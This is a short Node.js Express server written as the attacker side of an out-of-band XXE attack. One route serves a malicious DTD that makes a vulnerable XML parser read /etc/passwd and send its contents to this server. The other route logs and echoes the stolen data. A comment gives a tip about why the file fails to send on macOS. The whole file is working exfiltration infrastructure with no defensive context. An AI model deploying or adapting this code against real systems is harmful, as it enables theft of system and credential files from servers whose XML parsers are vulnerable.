//Node.js server - /etc/passwd contains # in Line one for mac. Data won't be send to server. 
var express = require('express');
var app = express();
app.get('/', function(req, res) {
	console.log("GET /");
  var resp=req.query.data;
  console.log("Data: "+ resp)
  res.send('Response</br>'+resp)

});
app.get('/dtd', function(req, res) {

  var resp='<!ENTITY % p1 SYSTEM "file:///etc/passwd"><!ENTITY % p2 "<!ENTITY data SYSTEM \'http://localhost:8000/?data=%p1;\'>">%p2;';
  console.log("Sending Attacker DTD..... ")
  res.contentType('text/plain');
  res.send(resp)

});
app.listen(8000);
